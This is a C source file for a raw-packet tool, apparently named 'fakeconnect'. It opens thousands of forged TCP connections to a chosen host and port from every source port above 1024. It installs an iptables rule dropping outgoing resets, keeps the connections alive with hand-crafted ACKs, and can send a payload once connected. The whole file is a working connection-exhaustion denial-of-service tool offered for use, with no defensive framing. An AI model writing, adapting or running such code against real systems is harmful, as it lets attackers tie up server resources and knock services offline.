#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#define __FAVOR_BSD
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>

#define BLOCK_COUNT 10

#include "fakeconnect.h"
#include "capture.h"

long getmsec();
void usage(char *arg);
void cleanup(int sg);



struct s_queue *add_queue(struct s_queue *s_q, unsigned long s_addr, unsigned long d_addr, int sport, int dport, unsigned long seq, unsigned long ack, int status)
{
    struct in_addr in;
    struct s_queue_hdr *s_fd;

    if (!s_q) {
	s_q = (struct s_queue *) calloc(1, sizeof(struct s_queue));
    }
    s_fd = (struct s_queue_hdr *) calloc(1, sizeof(struct s_queue_hdr));

    if (!s_q->s_first) {
	s_q->s_first = s_fd;
    } else {
	s_fd->s_right = NULL;
	s_fd->s_left = s_q->s_last;
	s_q->s_last->s_right = s_fd;
    }
    s_q->s_last = s_fd;

    s_fd->s_addr = s_addr;
    s_fd->d_addr = d_addr;
    s_fd->sport = sport;
    s_fd->dport = dport;
    s_fd->seq = seq;
    s_fd->ack = ack;
    s_fd->status = status;

    return s_q;
}
struct s_queue_hdr *del_queue(struct s_queue *s_q, struct s_queue_hdr *s_fd)
{
    struct s_queue_hdr *s_tmp;

    s_tmp = s_fd->s_right;

    if (s_q->s_last == s_fd)
	s_q->s_last = s_fd->s_left;

    if (s_q->s_first == s_fd)
	s_q->s_first = s_fd->s_right;

    if (s_fd->s_left) {
	s_fd->s_left->s_right = s_fd->s_right;
    }
    if (s_fd->s_right) {
	s_fd->s_right->s_left = s_fd->s_left;
    }
    free(s_fd);

    return s_tmp;
}

struct s_data_hdr {
    int sock_snd;
    unsigned long time_array[65535];
    unsigned char status_array[65535];

    struct s_packet_hdr *s_packet;
    struct s_queue *s_queue;
};
void main(int argc, char *argv[])
{
    int lt = 0;
    fd_set fds;
    char *arg_src = NULL;
    char *arg_dst = NULL;
    char *arg_data = NULL;
    int arg_data_size;
    int arg_dport = 0;
    int arg_block = 10;
    int arg_time = 100;
    int c;

    struct s_data_hdr s_data;
    struct timeval tv;

    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, cleanup);
    signal(SIGTERM, cleanup);
    signal(SIGKILL, cleanup);
    signal(SIGQUIT, cleanup);
    signal(SIGSTOP, cleanup);


    memset(&s_data, 0x00, sizeof(struct s_data_hdr));


    while ((c = getopt(argc, argv, "s:d:p:b:t:a:")) != -1) {
	switch (c) {
	case 's':
	    arg_src = optarg;
	    break;
	case 'd':
	    arg_dst = optarg;
	    break;
	case 'p':
	    arg_dport = atoi(optarg);
	    break;
	case 'b':
	    arg_block = atoi(optarg);
	    break;
	case 't':
	    arg_time = atoi(optarg);
	    break;
	case 'a':
	    arg_data = optarg;
	    break;
	default:
	    usage(argv[0]);
	    break;
	}
    }
    if (!arg_src || !arg_dst || !arg_dport) {
	usage(argv[0]);
    }
    printf("SOURCE ADDRESS		: %s\n", arg_src);
    printf("DESTINATION ADDRESS	: %s\n", arg_dst);
    fflush(stdout);

    printf("iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP\n");
    system("iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP");

    if (!arg_data) {
	if (strcmp(argv[argc - 1], "-") == 0) {
	    arg_data = malloc(1024);
	    arg_data_size = read(0, arg_data, 1024);
	}
    } else {
	arg_data_size = strlen(arg_data);
    }
    if (!(s_data.sock_snd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))) {
	perror("socket");
	exit(0);
    }

    s_data.s_packet = sock_capture_init();

    while (1) {
	tv.tv_sec = 0;
	tv.tv_usec = 10000;

	FD_ZERO(&fds);
	FD_SET(s_data.s_packet->sock, &fds);

	select(s_data.s_packet->sock + 1, &fds, NULL, NULL, &tv);

	if (FD_ISSET(s_data.s_packet->sock, &fds)) {
	    handle_raw_packet(&s_data, arg_data, arg_data_size);
	}
	if (getmsec() > lt + arg_time) {
	    send_next_block(&s_data, arg_block, arg_src, arg_dst, arg_dport);

	    lt = getmsec();
	}

    }
    printf("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP");
    system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP");

}

long getmsec()
{
    struct timeval tv;

    gettimeofday(&tv, (struct timezone *) NULL);

    return (tv.tv_sec % 1000000) * 1000 + tv.tv_usec / 1000;

}

int handle_raw_packet(struct s_data_hdr *s_data, char *data, int data_size)
{
    int match=0;
    struct s_queue_hdr *s_q;

    sock_capture(s_data->s_packet);

    if (!s_data->s_queue) {
	return 0;
    }
    s_q = s_data->s_queue->s_first;
    while (s_q) {
	if (s_data->s_packet->ip->ip_src.s_addr == s_q->d_addr && ntohs(s_data->s_packet->tcp->th_dport) == s_q->sport) {
	    switch (s_data->status_array[s_q->sport]) {
	    case 0x00:
		break;
	    case 0x01:
		if (s_data->s_packet->tcp->th_flags & TH_ACK) {
		    if (ntohl(s_data->s_packet->tcp->th_ack) == s_q->seq + 1) {
			s_data->status_array[s_q->sport] = 2;

			s_q->ack = ntohl(s_data->s_packet->tcp->th_seq);

			s_q->seq++;
			s_q->ack++;

			i_send_ack(s_data->sock_snd, s_q->s_addr, s_q->d_addr, s_q->sport, s_q->dport, s_q->seq, s_q->ack);
			if (data) {
			    i_send_data(s_data->sock_snd, s_q->s_addr, s_q->d_addr, s_q->sport, s_q->dport, s_q->seq, s_q->ack, data, data_size);
			}
			printf("CONNECTED [%05d] SEQ: %u ACK: %u\n", s_q->sport, s_data->s_packet->tcp->th_seq, s_data->s_packet->tcp->th_ack);
			fflush(stdout);
			
			match = 1;
		    } 
		} else {
		    if( s_q->sport <65535 ){
			s_data->status_array[s_q->sport] = 0;
			s_data->time_array[s_q->sport] = 0;
		    }		    
		    del_queue(s_data->s_queue, s_q);
 		     match = 1;
		}
		break;
	    case 0x02:
		if (s_data->s_packet->tcp->th_flags & TH_FIN) {
		    if( s_q->sport <65535 ){
			s_data->status_array[s_q->sport] = 0;
			s_data->time_array[s_q->sport] = 0;
		    }		    
		    del_queue(s_data->s_queue, s_q);
 		    match = 1;
		}
		else if (s_data->s_packet->tcp->th_flags & TH_RST) {
		    if( s_q->sport <65535 ){
			s_data->status_array[s_q->sport] = 0;
			s_data->time_array[s_q->sport] = 0;
		    }		    
		    del_queue(s_data->s_queue, s_q);
 		    match = 1;
		}
		else if (s_data->s_packet->tcp->th_flags & TH_ACK) {
		    s_q->seq++;
		    s_q->ack++;

		    i_send_ack(s_data->sock_snd, s_q->s_addr, s_q->d_addr, s_q->sport, s_q->dport, s_q->seq, s_q->ack);

		    if( s_q->sport <65535 ){
		    	s_data->time_array[s_q->sport] = time(NULL);
		    }
 		    match = 1;
		}
		break;
	    default:
		break;
	    }
	    break;
	}
	s_q = s_q->s_right;
    }
}

int send_next_block(struct s_data_hdr *s_data, int block_size, char *source, char *dest, int dport)
{
    int count = 0;
    int i;
    int block_count = 0;

    for (i = 1024; i < 65535; i++) {
	if (s_data->status_array[i] == 0) {
	    s_data->s_queue = add_queue(s_data->s_queue, inet_addr(source), inet_addr(dest), i, dport, i * 2, 0, 1);
	    send_syn(s_data->sock_snd, source, dest, (i * 2), i, dport);

	    block_count++;
	    s_data->time_array[i] = time(NULL);
	    s_data->status_array[i] = 1;
	} else if (s_data->status_array[i] == 1 && time(NULL) > s_data->time_array[i] + 10) {
	    send_syn(s_data->sock_snd, source, dest, (i * 2), i, dport);

	    block_count++;
	    s_data->time_array[i] = time(NULL);
	    s_data->status_array[i] = 1;
	} else if (s_data->status_array[i] != 2 && time(NULL) > s_data->time_array[i] + 5) {
	    send_syn(s_data->sock_snd, source, dest, (i * 2), i, dport);

	    block_count++;
	    s_data->time_array[i] = time(NULL);
	    s_data->status_array[i] = 1;
	} else if (s_data->status_array[i] == 2 && time(NULL) > s_data->time_array[i] + 120) {
	    send_syn(s_data->sock_snd, source, dest, (i * 2), i, dport);

	    block_count++;
	    s_data->time_array[i] = time(NULL);
	    s_data->status_array[i] = 1;
	}
	if (block_count >= block_size) {
	    break;
	}
    }
}
void usage(char *arg)
{
    printf("Uso: %s -[sdp] -<bta>\n", arg);
    printf("Commands:\n");
    printf("	-s [ip address]		Source address\n");
    printf("	-d [ip address]		Destination address\n");
    printf("	-p [port number]	Destination port\n");
    printf("Args\n");
    printf("	-b [block_size]  	Block number\n");
    printf(" 	-t [miliseconds] 	sleep time\n");
    printf("	-a '[string]'		Send a string ( after connected )\n");
    printf("	-			Read data from stdin and send ( after connected )\n");
    
    exit(1);
}
void cleanup(int sg)
{
    printf("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP\n");
    system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP");
    exit  ( 0 );
}
